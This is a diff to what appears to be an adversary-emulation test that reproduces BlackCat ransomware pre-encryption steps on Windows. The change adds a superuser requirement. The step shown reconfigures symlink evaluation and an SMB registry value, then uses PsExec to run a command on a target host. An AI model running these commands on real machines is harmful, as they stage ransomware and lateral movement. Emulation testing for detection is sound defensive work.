@@ -16,6 +16,7 @@ mitre:
 requirements:
     platforms:
         - os: windows
+    superuser: true
 steps:
     - name: blackcat-pre-encryption-cmds-with-lateral-movement
       inline: "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\{{.Args.targethost}} cmd.exe  /c echo \"--access-token\"\"\n"
